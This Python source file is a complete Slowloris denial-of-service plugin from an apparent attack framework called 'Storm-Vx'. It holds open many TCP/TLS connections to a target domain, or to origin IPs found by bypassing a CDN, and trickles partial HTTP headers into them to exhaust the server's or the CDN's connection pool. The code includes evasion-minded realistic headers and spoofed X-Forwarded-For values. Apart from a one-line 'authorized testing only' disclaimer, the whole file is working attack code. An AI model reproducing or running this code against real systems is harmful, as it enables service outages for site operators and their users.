#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_slowloris — Slowloris TCP Attack Plugin (v24 P0)

Opens connections and sends partial headers slowly to keep connections
open as long as possible, exhausting server connection pools.

v24: Now works BOTH with origin IPs AND directly against the target.
When no origin IPs are available, connects directly to the target domain.
This is critical because slowloris doesn't need CDN bypass — it just
needs to hold connections open, which works through CDNs too (CDNs
have their own connection limits).

Also improved header crafting for more realistic partial requests.

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import ssl
import socket
from typing import Dict, Any, List
from urllib.parse import urlparse


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from tester.response_pipeline import RawConnectionPipeline
from vf_common import C, rand_str, random_ua
from config.defaults import RAW_CONNECT_TIMEOUT, WRITER_CLOSE_TIMEOUT

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["SlowlorisPlugin"]


class SlowlorisPlugin(AttackPlugin):
    """Slowloris attack (v24: works with or without origin IPs).

    Opens TCP connections and sends partial HTTP headers very slowly,
    keeping connections alive for extended periods. This exhausts
    the server's connection pool without needing high bandwidth.

    v24: Can now connect directly to the target domain (not just origin IPs).
    When connecting through CDN, the CDN's connection pool is exhausted
    instead, which is equally effective.
    """

    meta = PluginMeta(
        name='slowloris',
        version='2.0.0',
        plugin_type='attack',
        description='Slowloris — slow partial headers to exhaust connection pools (works with or without origin IPs)',
        tags=['origin', 'tcp', 'slowloris', 'connection-exhaust'],
        priority=35,
        compatible_profiles=[],
        requirements=[],
    )

    def __init__(self) -> None:
        super().__init__()
        # S1a: SSL context will be created per-run based on verify_ssl setting
        self._ssl_ctx = None  # Set in _worker_loop from context

    def _create_response_pipeline(self):
        """BUG-016 FIX: Use RawConnectionPipeline for TCP-based slowloris."""
        return RawConnectionPipeline(
            target_selector=self._target_selector,
            pacer=self._pacer,
            context=self._context,
        )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Slowloris worker: slow partial headers."""
        origin_ips = context.origin_ips
        domain = context.domain
        target_is_https = urlparse(context.url).scheme == 'https'
        # B1 FIX: Use shared SSL context helper instead of duplicated code
        ssl_ctx = self._create_ssl_context(context)
        use_tls = ssl_ctx is not None

        # v24: Determine connection targets
        # If origin IPs available, use them (bypass CDN)
        # Otherwise, connect directly to the target domain
        use_origin = bool(origin_ips)

        while not self._stop_event.is_set():
            try:
                # v24: Choose where to connect
                if use_origin:
                    target_host = random.choice(origin_ips)
                    server_hostname = domain  # SNI = actual domain
                else:
                    # v24: Connect directly to the target domain
                    # DNS resolution gives us the CDN IP, which is fine
                    target_host = domain
                    server_hostname = domain

                port = 443 if use_tls else 80
                writer = None
                try:
                    # BUG-FIX v33: Simplified dead-code branches.
                    # The `use_origin and use_tls` and `use_tls` branches
                    # were identical (target_host/server_hostname set above).
                    if use_tls:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(
                                target_host, port, ssl=ssl_ctx, server_hostname=server_hostname),
                            timeout=RAW_CONNECT_TIMEOUT)  # W2.4
                    else:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(target_host, port),
                            timeout=RAW_CONNECT_TIMEOUT)  # W2.4

                    # v25 P1: Use evasion-aware headers for more realistic partial request
                    headers = self._get_fresh_headers(context, "document")
                    partial_req = (
                        f"GET /{rand_str(4)} HTTP/1.1\r\n"
                        f"Host: {domain}\r\n"
                        f"User-Agent: {headers.get('User-Agent', random_ua())}\r\n"
                        f"Accept: {headers.get('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')}\r\n"
                        f"Accept-Language: {headers.get('Accept-Language', 'en-US,en;q=0.9')}\r\n"
                        f"Connection: keep-alive\r\n"
                    )
                    writer.write(partial_req.encode())
                    await writer.drain()

                    # v29: Record success IMMEDIATELY after connection + partial headers sent.
                    # Previously, _record was only called after the full 45-90 second
                    # slowloris cycle, meaning t:0 was reported if the attack was cut
                    # short by the death spiral. Now we record when the connection is
                    # established and partial headers are sent, which is the key action.
                    await self._record("TCP-RAW", True, 0, 0, hint="slowloris-conn")
                    self._on_request_result(worker_id, True)
                    # BUG-016 FIX: Process through RawConnectionPipeline
                    self._response_pipeline.process(success=True, url=context.url, worker_id=worker_id)

                    # Slowloris: send partial headers to keep connection open
                    for i in range(30):
                        if self._stop_event.is_set():
                            break
                        await asyncio.sleep(random.uniform(1.5, 3.0))
                        # v24: More realistic header names
                        header_name = random.choice([
                            f"X-Custom-{rand_str(3)}",
                            f"X-Request-{rand_str(3)}",
                            f"X-Forwarded-For",
                            f"X-Real-IP",
                            f"Accept-Encoding",
                        ])
                        if header_name in ("X-Forwarded-For", "X-Real-IP"):
                            header_value = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                        elif header_name == "Accept-Encoding":
                            header_value = random.choice(["gzip, deflate", "gzip, deflate, br", "identity"])
                        else:
                            header_value = rand_str(12)
                        writer.write(f"{header_name}: {header_value}\r\n".encode())
                        await writer.drain()

                    # BUG-FIX v33: Removed duplicate _record call that double-counted
                    # success/RPS. The early record at line 134 already captures
                    # the connection establishment. This second record inflated
                    # slowloris success count by 2x.
                finally:
                    if writer:
                        try:
                            writer.close()
                            await asyncio.wait_for(writer.wait_closed(), timeout=WRITER_CLOSE_TIMEOUT)  # W2.4
                        except (OSError, RuntimeError, ConnectionError, asyncio.TimeoutError):
                            pass  # Cleanup errors are acceptable
            except asyncio.CancelledError:
                raise
            except (OSError, ConnectionError, asyncio.TimeoutError, ssl.SSLError) as exc:
                await self._record("TCP-RAW", False, 0, 0, err=type(exc).__name__)
                self._on_request_result(worker_id, False)
                # BUG-016 FIX: Process through RawConnectionPipeline
                self._response_pipeline.process(success=False, url=context.url, worker_id=worker_id, error_type=type(exc).__name__)
                await asyncio.sleep(1)


